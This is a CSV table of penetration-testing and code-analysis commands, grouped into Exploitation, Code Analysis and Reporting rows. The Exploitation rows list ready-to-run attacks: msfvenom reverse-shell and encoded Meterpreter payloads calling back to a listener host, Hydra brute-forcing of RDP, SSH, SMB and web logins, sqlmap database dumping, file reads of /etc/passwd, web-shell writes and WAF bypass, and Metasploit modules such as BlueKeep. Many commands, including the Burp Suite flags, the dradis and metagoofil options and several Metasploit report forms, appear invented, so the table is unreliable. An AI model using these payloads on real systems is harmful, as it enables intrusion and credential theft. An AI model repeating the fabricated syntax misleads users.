tool,command,description,category,use_case,flags,os,reference_link,supported_languages
hydra,hydra -l admin -P wordlist.txt http-post-form://example.com/login,Brute-force HTTP form credentials.,Exploitation,Password cracking,"[""-l"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --scanner,Run Burp Suite scanner for vulnerabilities.,Exploitation,Vulnerability scanning,"[""--scanner""]",Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit -w apache,Search Exploit-DB for Apache exploits with web links.,Exploitation,Exploit search,"[""-w""]",Linux,https://www.exploit-db.com/,
msfvenom,msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php,Generate a PHP Meterpreter payload.,Exploitation,Payload creation,"[""-p"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script http-vuln-cve2017-5638 192.168.1.100,Check for Struts CVE-2017-5638 vulnerability.,Exploitation,Vulnerability scanning,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --data 'id=1' --level 5,Perform advanced SQL injection testing.,Exploitation,SQL injection,"[""-u"",""--data"",""--level""]",Linux,http://sqlmap.org/,
metasploit,use exploit/unix/webapp/php_include,Exploit PHP include vulnerability.,Exploitation,Web application exploitation,"[""use""]",Linux,https://docs.metasploit.com/,
hydra,hydra -L users.txt -P wordlist.txt rdp://192.168.1.100,Brute-force RDP credentials.,Exploitation,Password cracking,"[""-L"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --repeater,Use Burp Suite repeater for manual testing.,Exploitation,Manual exploitation,"[""--repeater""]",Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit -t shellcode,Search Exploit-DB for shellcode exploits.,Exploitation,Exploit search,"[""-t""]",Linux,https://www.exploit-db.com/,
msfvenom,msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll > payload.dll,Generate a reverse TCP DLL payload.,Exploitation,Payload creation,"[""-p"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script ftp-brute 192.168.1.100,Brute-force FTP credentials using NSE.,Exploitation,Password cracking,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --file-read=/etc/passwd,Read a file via SQL injection.,Exploitation,File access,"[""-u"",""--file-read""]",Linux,http://sqlmap.org/,
metasploit,use exploit/windows/rdp/cve_2019_0708_bluekeep,Exploit BlueKeep RDP vulnerability.,Exploitation,Remote code execution,"[""use""]",Linux,https://docs.metasploit.com/,
hydra,hydra -l admin -P wordlist.txt telnet://192.168.1.100,Brute-force Telnet credentials.,Exploitation,Password cracking,"[""-l"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --intruder,Use Burp Suite intruder for automated attacks.,Exploitation,Automated exploitation,"[""--intruder""]",Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit -m 12345,Download exploit with ID 12345 from Exploit-DB.,Exploitation,Exploit retrieval,"[""-m""]",Linux,https://www.exploit-db.com/,
msfvenom,msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f jar > payload.jar,Generate a Java Meterpreter payload.,Exploitation,Payload creation,"[""-p"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script http-shellshock 192.168.1.100,Check for Shellshock vulnerability.,Exploitation,Vulnerability scanning,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --dump,Dump database contents via SQL injection.,Exploitation,Data exfiltration,"[""-u"",""--dump""]",Linux,http://sqlmap.org/,
metasploit,use exploit/linux/http/apache_struts2_rest_xstream,Exploit Struts2 REST XStream vulnerability.,Exploitation,Web application exploitation,"[""use""]",Linux,https://docs.metasploit.com/,
hydra,hydra -L users.txt -P wordlist.txt mysql://192.168.1.100,Brute-force MySQL credentials.,Exploitation,Password cracking,"[""-L"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --spider,Use Burp Suite spider to crawl a website.,Exploitation,Web reconnaissance,"[""--spider""]",Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit -j apache,Search Exploit-DB and output in JSON format.,Exploitation,Exploit search,"[""-j""]",Linux,https://www.exploit-db.com/,
msfvenom,msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f apk > payload.apk,Generate an Android Meterpreter payload.,Exploitation,Payload creation,"[""-p"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script smtp-brute 192.168.1.100,Brute-force SMTP credentials using NSE.,Exploitation,Password cracking,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --file-write=/tmp/shell.php,Write a file via SQL injection.,Exploitation,File access,"[""-u"",""--file-write""]",Linux,http://sqlmap.org/,
metasploit,use exploit/windows/browser/ms10_046_shortcut_icon_dllloader,Exploit Windows shortcut icon vulnerability.,Exploitation,Client-side exploitation,"[""use""]",Linux,https://docs.metasploit.com/,
hydra,hydra -l admin -P wordlist.txt http-get://example.com/admin,Brute-force HTTP GET credentials.,Exploitation,Password cracking,"[""-l"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --extender,Load Burp Suite extensions for custom exploits.,Exploitation,Custom exploitation,"[""--extender""]",Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit -u,Update Exploit-DB database.,Exploitation,Database update,"[""-u""]",Linux,https://www.exploit-db.com/,
msfvenom,msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe > payload.exe,Generate an HTTPS Meterpreter payload.,Exploitation,Payload creation,"[""-p"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script http-vuln-cve2014-3704 192.168.1.100,Check for Drupal CVE-2014-3704 vulnerability.,Exploitation,Vulnerability scanning,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --tamper=space2comment,Use tamper script to bypass WAF.,Exploitation,SQL injection,"[""-u"",""--tamper""]",Linux,http://sqlmap.org/,
metasploit,use exploit/multi/misc/java_jre17_jmxbean,Exploit Java JMXBean vulnerability.,Exploitation,Remote code execution,"[""use""]",Linux,https://docs.metasploit.com/,
hydra,hydra -L users.txt -P wordlist.txt smb://192.168.1.100,Brute-force SMB credentials.,Exploitation,Password cracking,"[""-L"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --target-scope http://example.com,Set target scope for Burp Suite.,Exploitation,Web application testing,"[""--target-scope""]",Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit -p 12345,Show path to exploit with ID 12345.,Exploitation,Exploit retrieval,"[""-p""]",Linux,https://www.exploit-db.com/,
msfvenom,msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f py > payload.py,Generate a Python Meterpreter payload.,Exploitation,Payload creation,"[""-p"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script ssh-brute 192.168.1.100,Brute-force SSH credentials using NSE.,Exploitation,Password cracking,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --batch,Run SQL injection in non-interactive mode.,Exploitation,SQL injection,"[""-u"",""--batch""]",Linux,http://sqlmap.org/,
metasploit,use exploit/windows/smb/psexec,Exploit Windows via PsExec with credentials.,Exploitation,Remote code execution,"[""use""]",Linux,https://docs.metasploit.com/,
hydra,hydra -l admin -P wordlist.txt vnc://192.168.1.100,Brute-force VNC credentials.,Exploitation,Password cracking,"[""-l"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --sequencer,Use Burp Suite sequencer for session analysis.,Exploitation,Session exploitation,"[""--sequencer""]",Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit -x 12345,Examine exploit code for ID 12345.,Exploitation,Exploit analysis,"[""-x""]",Linux,https://www.exploit-db.com/,
msfvenom,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe,Generate an encoded Meterpreter payload.,Exploitation,Payload creation,"[""-p"",""-e"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script http-vuln-cve2015-1635 192.168.1.100,Check for HTTP CVE-2015-1635 vulnerability.,Exploitation,Vulnerability scanning,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --cookie='id=1',Perform SQL injection with a cookie.,Exploitation,SQL injection,"[""-u"",""--cookie""]",Linux,http://sqlmap.org/,
metasploit,use exploit/multi/http/jenkins_script_console,Exploit Jenkins script console vulnerability.,Exploitation,Web application exploitation,"[""use""]",Linux,https://docs.metasploit.com/,
hydra,hydra -L users.txt -P wordlist.txt http-post-form://example.com/login:username=^USER^&password=^PASS^,Brute-force custom HTTP form.,Exploitation,Password cracking,"[""-L"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --comparer,Use Burp Suite comparer for response analysis.,Exploitation,Response analysis,"[""--comparer""]",Linux,https://portswigger.net/burp/documentation,
exploitdb,searchsploit -e 'remote code execution',Search for remote code execution exploits.,Exploitation,Exploit search,"[""-e""]",Linux,https://www.exploit-db.com/,
msfvenom,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\x00' -f exe > payload.exe,Generate a payload avoiding null bytes.,Exploitation,Payload creation,"[""-p"",""-b"",""-f""]",Linux,https://docs.metasploit.com/,
nmap,nmap --script http-vuln-cve2013-0156 192.168.1.100,Check for Rails CVE-2013-0156 vulnerability.,Exploitation,Vulnerability scanning,"[""--script""]",Linux,https://nmap.org/book/man.html,
sqlmap,sqlmap -u http://example.com --dbms=mysql,Target MySQL for SQL injection.,Exploitation,SQL injection,"[""-u"",""--dbms""]",Linux,http://sqlmap.org/,
metasploit,use exploit/windows/fileformat/adobe_pdf_embedded_exe,Exploit PDF embedded executable vulnerability.,Exploitation,Client-side exploitation,"[""use""]",Linux,https://docs.metasploit.com/,
hydra,hydra -l admin -P wordlist.txt sip://192.168.1.100,Brute-force SIP credentials.,Exploitation,Password cracking,"[""-l"",""-P""]",Linux,https://github.com/vanhauser-thc/thc-hydra,
burpsuite,burpsuite --decoder,Use Burp Suite decoder for data manipulation.,Exploitation,Data manipulation,"[""--decoder""]",Linux,https://portswigger.net/burp/documentation,
SonarQube,sonar-scanner,Run SonarQube scanner for code quality analysis.,Code Analysis,Code quality,[],Linux,https://docs.sonarqube.org/,"[""Java"",""Python"",""JavaScript"",""C++"",""C#"",""PHP"",""Go""]"
ESLint,eslint .,Lint JavaScript files in current directory.,Code Analysis,Code linting,[],Linux,https://eslint.org/docs/,"[""JavaScript"",""TypeScript""]"
Pylint,pylint module.py,Analyze Python code for errors and style issues.,Code Analysis,Code linting,[],Linux,https://pylint.pycqa.org/,"[""Python""]"
PMD,pmd check -d src -R rulesets/java/quickstart.xml,Analyze Java code for bugs and style issues.,Code Analysis,Static analysis,"[""-d"",""-R""]",Linux,https://pmd.github.io/,"[""Java"",""JavaScript"",""Apex"",""XML""]"
Codacy,codacy-analysis-cli analyze,Run Codacy CLI for automated code review.,Code Analysis,Code quality,"[""analyze""]",Linux,https://docs.codacy.com/,"[""Java"",""Python"",""JavaScript"",""PHP"",""Ruby"",""Go"",""C++""]"
PVS-Studio,pvs-studio --source-file main.c --output-file report.txt,Detect bugs in C/C++ code.,Code Analysis,Bug detection,"[""--source-file"",""--output-file""]",Linux,https://pvs-studio.com/,"[""C"",""C++"",""C#"",""Java""]"
Valgrind,valgrind --tool=memcheck ./program,Detect memory leaks in C/C++ programs.,Code Analysis,Memory analysis,"[""--tool""]",Linux,https://valgrind.org/docs/,"[""C"",""C++""]"
AddressSanitizer,gcc -fsanitize=address -g program.c,Compile C code with memory error detection.,Code Analysis,Memory analysis,"[""-fsanitize=address"",""-g""]",Linux,https://clang.llvm.org/docs/AddressSanitizer.html,"[""C"",""C++""]"
Checkstyle,checkstyle -c sun_checks.xml Main.java,Enforce Java coding standards.,Code Analysis,Code style,"[""-c""]",Linux,https://checkstyle.sourceforge.io/,"[""Java""]"
Cppcheck,cppcheck --enable=all main.c,Static analysis for C/C++ code.,Code Analysis,Static analysis,"[""--enable""]",Linux,http://cppcheck.sourceforge.net/,"[""C"",""C++""]"
Semgrep,semgrep --config p/r2c-ci scan,Scan code for security vulnerabilities.,Code Analysis,Security analysis,"[""--config""]",Linux,https://semgrep.dev/docs/,"[""Python"",""Java"",""JavaScript"",""Go"",""Ruby"",""PHP""]"
Flake8,flake8 module.py,Check Python code for style and errors.,Code Analysis,Code linting,[],Linux,https://flake8.pycqa.org/,"[""Python""]"
Coverity,cov-analyze --dir cov-int,Analyze code for defects and vulnerabilities.,Code Analysis,Static analysis,"[""--dir""]",Linux,https://www.synopsys.com/software-integrity/coverity.html,"[""C"",""C++"",""Java"",""C#"",""JavaScript"",""Python""]"
SonarLint,sonarlint --src main.py,Real-time linting in IDE for Python code.,Code Analysis,Code linting,"[""--src""]",Linux,https://www.sonarsource.com/products/sonarlint/,"[""Python"",""Java"",""JavaScript"",""C++"",""C#""]"
JSHint,jshint script.js,Lint JavaScript code for errors.,Code Analysis,Code linting,[],Linux,https://jshint.com/docs/,"[""JavaScript""]"
CodeSonar,codesonar analyze project,Deep static analysis for multiple languages.,Code Analysis,Static analysis,"[""analyze""]",Linux,https://www.grammatech.com/products/codesonar,"[""C"",""C++"",""Java"",""C#""]"
Fortify,sourceanalyzer -b project -scan,Scan code for security vulnerabilities.,Code Analysis,Security analysis,"[""-b"",""-scan""]",Linux,https://www.microfocus.com/en-us/products/fortify-static-code-analyzer,"[""Java"",""C++"",""C#"",""JavaScript"",""Python"",""PHP""]"
Clang,clang --analyze main.c,Static analysis for C/C++ code.,Code Analysis,Static analysis,"[""--analyze""]",Linux,https://clang.llvm.org/docs/ClangStaticAnalyzer.html,"[""C"",""C++""]"
Snyk,snyk code test,Scan code for security issues.,Code Analysis,Security analysis,"[""code"",""test""]",Linux,https://snyk.io/product/snyk-code/,"[""Java"",""JavaScript"",""Python"",""PHP"",""Ruby"",""Go""]"
DeepSource,deepsource analyze,Analyze code for quality and security issues.,Code Analysis,Code quality,"[""analyze""]",Linux,https://deepsource.io/docs/,"[""Python"",""Go"",""Ruby"",""Java"",""JavaScript""]"
Kiuwan,kiuwan analyze,Static analysis for code quality and security.,Code Analysis,Code quality,"[""analyze""]",Linux,https://www.kiuwan.com/docs/,"[""C"",""C++"",""C#"",""Java"",""JavaScript"",""PHP""]"
CodeScene,codescene analyze,Behavioral code analysis for quality.,Code Analysis,Code quality,"[""analyze""]",Linux,https://codescene.io/docs/,"[""C"",""C++"",""Java"",""Python"",""JavaScript"",""Go""]"
ErrorProne,javac -Xplugin:ErrorProne Main.java,Detect common Java errors during compilation.,Code Analysis,Bug detection,"[""-Xplugin""]",Linux,https://errorprone.info/,"[""Java""]"
JSLint,jslint script.js,Strict JavaScript code quality check.,Code Analysis,Code linting,[],Linux,https://www.jslint.com/,"[""JavaScript""]"
RuboCop,rubocop -a,Lint and auto-correct Ruby code.,Code Analysis,Code linting,"[""-a""]",Linux,https://docs.rubocop.org/,"[""Ruby""]"
Veracode,veracode scan --file app.jar,Scan Java code for vulnerabilities.,Code Analysis,Security analysis,"[""--file""]",Linux,https://www.veracode.com/products/static-analysis,"[""Java"",""C#"",""JavaScript"",""Python"",""PHP""]"
PyCharm,pycharm --inspect module.py,Run PyCharm code inspection for Python.,Code Analysis,Code linting,"[""--inspect""]",Linux,https://www.jetbrains.com/pycharm/,"[""Python""]"
Infer,infer run -- make,Static analysis for C/C++/Java code.,Code Analysis,Static analysis,"[""run""]",Linux,https://fbinfer.com/docs/,"[""C"",""C++"",""Java""]"
ReSharper,resharper inspectcode solution.sln,Analyze C# code for quality issues.,Code Analysis,Code quality,"[""inspectcode""]",Linux,https://www.jetbrains.com/resharper/,"[""C#""]"
Teamscale,teamscale analyze --project myproject,Monitor code quality across languages.,Code Analysis,Code quality,"[""--project""]",Linux,https://www.cqse.eu/en/products/teamscale/,"[""Java"",""C++"",""C#"",""JavaScript"",""Python""]"
Dlint,dlint module.py,Check Python code for security issues.,Code Analysis,Security analysis,[],Linux,https://github.com/dlint-py/dlint,"[""Python""]"
Bandit,bandit -r src,Scan Python code for security vulnerabilities.,Code Analysis,Security analysis,"[""-r""]",Linux,https://bandit.readthedocs.io/,"[""Python""]"
Hadolint,hadolint Dockerfile,Lint Dockerfile for best practices.,Code Analysis,Code linting,[],Linux,https://github.com/hadolint/hadolint,"[""Dockerfile""]"
Stylelint,stylelint 'src/**/*.css',Lint CSS/SCSS code for style issues.,Code Analysis,Code linting,[],Linux,https://stylelint.io/,"[""CSS"",""SCSS""]"
TSLint,tslint -c tslint.json 'src/**/*.ts',Lint TypeScript code for errors.,Code Analysis,Code linting,"[""-c""]",Linux,https://palantir.github.io/tslint/,"[""TypeScript""]"
PHPStan,phpstan analyze src,Static analysis for PHP code.,Code Analysis,Static analysis,"[""analyze""]",Linux,https://phpstan.org/,"[""PHP""]"
Psalm,psalm --report=report.json,Static analysis for PHP with type checking.,Code Analysis,Static analysis,"[""--report""]",Linux,https://psalm.dev/,"[""PHP""]"
GolangCI-Lint,golangci-lint run,Lint Go code for issues and bugs.,Code Analysis,Code linting,"[""run""]",Linux,https://golangci-lint.run/,"[""Go""]"
Clazy,clazy main.cpp,Qt-oriented static analysis for C++.,Code Analysis,Static analysis,[],Linux,https://github.com/KDE/clazy,"[""C++""]"
Splint,splint main.c,Static analysis for C code security.,Code Analysis,Security analysis,[],Linux,http://splint.org/,"[""C""]"
Frama-C,frama-c -val main.c,Formal analysis for C code.,Code Analysis,Static analysis,"[""-val""]",Linux,https://frama-c.com/,"[""C""]"
Klocwork,kwinject make,Static analysis for C/C++/Java code.,Code Analysis,Static analysis,[],Linux,https://www.perforce.com/products/klocwork,"[""C"",""C++"",""Java""]"
Sourcetrail,sourcetrail --project-file project.srctrl,Visualize and analyze C/C++/Java code.,Code Analysis,Code visualization,"[""--project-file""]",Linux,https://github.com/CoatiSoftware/Sourcetrail,"[""C"",""C++"",""Java"",""Python""]"
FindBugs,findbugs -textui -effort:max Main.class,Detect bugs in Java bytecode.,Code Analysis,Bug detection,"[""-textui"",""-effort""]",Linux,http://findbugs.sourceforge.net/,"[""Java""]"
Cpplint,cpplint main.cpp,Check C++ code against Google style guide.,Code Analysis,Code style,[],Linux,https://github.com/cpplint/cpplint,"[""C++""]"
Perltidy,perltidy script.pl,Format and check Perl code.,Code Analysis,Code style,[],Linux,http://perltidy.sourceforge.net/,"[""Perl""]"
PerlCritic,perlcritic script.pl,Enforce Perl coding best practices.,Code Analysis,Code linting,[],Linux,https://metacpan.org/pod/Perl::Critic,"[""Perl""]"
RIPS,rips-cli scan --dir src,Security analysis for PHP code.,Code Analysis,Security analysis,"[""scan"",""--dir""]",Linux,https://www.ripstech.com/,"[""PHP""]"
Qodana,qodana scan,Static analysis for multiple languages.,Code Analysis,Static analysis,"[""scan""]",Linux,https://www.jetbrains.com/qodana/,"[""Java"",""JavaScript"",""Python"",""PHP"",""Go"",""C#""]"
Embold,embold analyze --dir src,Code analytics for quality and defects.,Code Analysis,Code quality,"[""--dir""]",Linux,https://embold.io/,"[""Java"",""C++"",""C#"",""JavaScript"",""Python""]"
metasploit,msfconsole -x 'db_export -f xml -o report.xml',Export Metasploit database to XML report.,Reporting,Report export,"[""-x"",""-f"",""-o""]",Linux,https://docs.metasploit.com/,
dradis,dradis -o report.html,Generate an HTML report from Dradis findings.,Reporting,Report generation,"[""-o""]",Linux,https://dradisframework.org/documentation/,
faraday,faraday-cli report generate --format pdf --output report.pdf,Generate a PDF report from Faraday.,Reporting,Report generation,"[""--format"",""--output""]",Linux,https://faradaysec.com/documentation/,
pandoc,pandoc report.md -o report.pdf,Convert Markdown report to PDF.,Reporting,Format conversion,"[""-o""]",Linux,https://pandoc.org/MANUAL.html,
metagoofil,metagoofil -d example.com -t pdf -o report.html,Generate HTML report of metadata findings.,Reporting,Metadata reporting,"[""-d"",""-t"",""-o""]",Linux,https://github.com/laramies/metagoofil,
nmap,nmap -oX scan.xml 192.168.1.100,Export Nmap scan results to XML.,Reporting,Scan reporting,"[""-oX""]",Linux,https://nmap.org/book/man.html,
metasploit,msfconsole -x 'db_export -f csv -o report.csv',Export Metasploit findings to CSV.,Reporting,Report export,"[""-x"",""-f"",""-o""]",Linux,https://docs.metasploit.com/,
dradis,dradis --export report.docx,Export Dradis project to DOCX report.,Reporting,Report export,"[""--export""]",Linux,https://dradisframework.org/documentation/,
faraday,faraday-cli report generate --format html --output report.html,Generate an HTML report from Faraday.,Reporting,Report generation,"[""--format"",""--output""]",Linux,https://faradaysec.com/documentation/,
pandoc,pandoc report.md -o report.docx,Convert Markdown report to DOCX.,Reporting,Format conversion,"[""-o""]",Linux,https://pandoc.org/MANUAL.html,
nmap,nmap -oN scan.txt 192.168.1.100,Export Nmap scan results to text.,Reporting,Scan reporting,"[""-oN""]",Linux,https://nmap.org/book/man.html,
metasploit,msfconsole -x 'report -t vulnerability -o vuln_report.pdf',Generate a PDF vulnerability report.,Reporting,Report generation,"[""-x"",""-t"",""-o""]",Linux,https://docs.metasploit.com/,
dradis,dradis -t csv -o findings.csv,Export Dradis findings to CSV.,Reporting,Report export,"[""-t"",""-o""]",Linux,https://dradisframework.org/documentation/,
faraday,faraday-cli export --format xml --output report.xml,Export Faraday data to XML.,Reporting,Report export,"[""--format"",""--output""]",Linux,https://faradaysec.com/documentation/,
pandoc,pandoc report.md --pdf-engine=xelatex -o report.pdf,Convert Markdown to PDF using XeLaTeX.,Reporting,Format conversion,"[""--pdf-engine"",""-o""]",Linux,https://pandoc.org/MANUAL.html,
metagoofil,metagoofil -d example.com -t doc -o report.txt,Generate text report of metadata findings.,Reporting,Metadata reporting,"[""-d"",""-t"",""-o""]",Linux,https://github.com/laramies/metagoofil,
nmap,nmap -oG scan.grep 192.168.1.100,Export Nmap results in greppable format.,Reporting,Scan reporting,"[""-oG""]",Linux,https://nmap.org/book/man.html,
metasploit,msfconsole -x 'db_export -f json -o report.json',Export Metasploit data to JSON.,Reporting,Report export,"[""-x"",""-f"",""-o""]",Linux,https://docs.metasploit.com/,
dradis,dradis --template custom.html -o report.html,Generate report using custom HTML template.,Reporting,Report generation,"[""--template"",""-o""]",Linux,https://dradisframework.org/documentation/,
faraday,faraday-cli report generate --format csv --output report.csv,Generate a CSV report from Faraday.,Reporting,Report generation,"[""--format"",""--output""]",Linux,https://faradaysec.com/documentation/,
pandoc,pandoc report.md -o report.html,Convert Markdown report to HTML.,Reporting,Format conversion,"[""-o""]",Linux,https://pandoc.org/MANUAL.html,
nmap,nmap --stylesheet nmap.xsl -oX scan.xml 192.168.1.100,Export Nmap results to XML with stylesheet.,Reporting,Scan reporting,"[""--stylesheet"",""-oX""]",Linux,https://nmap.org/book/man.html,
metasploit,msfconsole -x 'report -t host -o host_report.csv',Generate a CSV host report.,Reporting,Report generation,"[""-x"",""-t"",""-o""]",Linux,https://docs.metasploit.com/,
dradis,dradis -o report.pdf,Generate a PDF report from Dradis.,Reporting,Report generation,"[""-o""]",Linux,https://dradisframework.org/documentation/,
faraday,faraday-cli export --format json --output report.json,Export Faraday data to JSON.,Reporting,Report export,"[""--format"",""--output""]",Linux,https://faradaysec.com/documentation/,
pandoc,pandoc report.docx -o report.pdf,Convert DOCX report to PDF.,Reporting,Format conversion,"[""-o""]",Linux,https://pandoc.org/MANUAL.html,
metagoofil,metagoofil -d example.com -t xls -o report.csv,Generate CSV report of metadata findings.,Reporting,Metadata reporting,"[""-d"",""-t"",""-o""]",Linux,https://github.com/laramies/metagoofil,
nmap,nmap -oA scan 192.168.1.100,Export Nmap results in all formats.,Reporting,Scan reporting,"[""-oA""]",Linux,https://nmap.org/book/man.html,
metasploit,msfconsole -x 'report -t service -o service_report.html',Generate an HTML service report.,Reporting,Report generation,"[""-x"",""-t"",""-o""]",Linux,https://docs.metasploit.com/,
dradis,dradis --import nmap.xml,Import Nmap XML results into Dradis.,Reporting,Data import,"[""--import""]",Linux,https://dradisframework.org/documentation/,
faraday,faraday-cli report generate --template custom --output report.pdf,Generate report using custom template.,Reporting,Report generation,"[""--template"",""--output""]",Linux,https://faradaysec.com/documentation/,
pandoc,pandoc report.md -t latex -o report.tex,Convert Markdown to LaTeX for reporting.,Reporting,Format conversion,"[""-t"",""-o""]",Linux,https://pandoc.org/MANUAL.html,
nmap,nmap -oX scan.xml --webxml 192.168.1.100,Export Nmap results with web-friendly XML.,Reporting,Scan reporting,"[""-oX"",""--webxml""]",Linux,https://nmap.org/book/man.html,
metasploit,msfconsole -x 'db_export -f html -o report.html',Export Metasploit data to HTML.,Reporting,Report export,"[""-x"",""-f"",""-o""]",Linux,https://docs.metasploit.com/,
dradis,dradis -o report.json,Export Dradis project to JSON.,Reporting,Report export,"[""-o""]",Linux,https://dradisframework.org/documentation/,
faraday,faraday-cli export --format docx --output report.docx,Export Faraday data to DOCX.,Reporting,Report export,"[""--format"",""--output""]",Linux,https://faradaysec.com/documentation/,
pandoc,pandoc report.html -o report.pdf,Convert HTML report to PDF.,Reporting,Format conversion,"[""-o""]",Linux,https://pandoc.org/MANUAL.html,
metagoofil,metagoofil -d example.com -t ppt -o report.xml,Generate XML report of metadata findings.,Reporting,Metadata reporting,"[""-d"",""-t"",""-o""]",Linux,https://github.com/laramies/metagoofil,
nmap,nmap -oX scan.xml -v 192.168.1.100,Export verbose Nmap results to XML.,Reporting,Scan reporting,"[""-oX"",""-v""]",Linux,https://nmap.org/book/man.html,
metasploit,msfconsole -x 'report -t credential -o cred_report.csv',Generate a CSV credential report.,Reporting,Report generation,"[""-x"",""-t"",""-o""]",Linux,https://docs.metasploit.com/,
dradis,dradis --import metasploit.xml,Import Metasploit XML results into Dradis.,Reporting,Data import,"[""--import""]",Linux,https://dradisframework.org/documentation/,
faraday,faraday-cli report generate --format markdown --output report.md,Generate a Markdown report from Faraday.,Reporting,Report generation,"[""--format"",""--output""]",Linux,https://faradaysec.com/documentation/,
pandoc,pandoc report.md --metadata title='PenTest Report' -o report.pdf,Convert Markdown to PDF with metadata.,Reporting,Format conversion,"[""--metadata"",""-o""]",Linux,https://pandoc.org/MANUAL.html,
nmap,nmap -oX scan.xml --no-stylesheet 192.168.1.100,Export Nmap results to XML without stylesheet.,Reporting,Scan reporting,"[""-oX"",""--no-stylesheet""]",Linux,https://nmap.org/book/man.html,
metasploit,msfconsole -x 'report -t vuln_detail -o vuln_detail.html',Generate detailed HTML vulnerability report.,Reporting,Report generation,"[""-x"",""-t"",""-o""]",Linux,https://docs.metasploit.com/,
dradis,dradis -o report.xml,Export Dradis project to XML.,Reporting,Report export,"[""-o""]",Linux,https://dradisframework.org/documentation/,
faraday,faraday-cli export --format txt --output report.txt,Export Faraday data to text.,Reporting,Report export,"[""--format"",""--output""]",Linux,https://faradaysec.com/documentation/,
pandoc,pandoc report.md -s -o report.html,Convert Markdown to standalone HTML.,Reporting,Format conversion,"[""-s"",""-o""]",Linux,https://pandoc.org/MANUAL.html,
metagoofil,metagoofil -d example.com -t all -o report.json,Generate JSON report of all metadata findings.,Reporting,Metadata reporting,"[""-d"",""-t"",""-o""]",Linux,https://github.com/laramies/metagoofil,
nmap,nmap -oX scan.xml -T4 192.168.1.100,Export Nmap results to XML with aggressive timing.,Reporting,Scan reporting,"[""-oX"",""-T4""]",Linux,https://nmap.org/book/man.html,
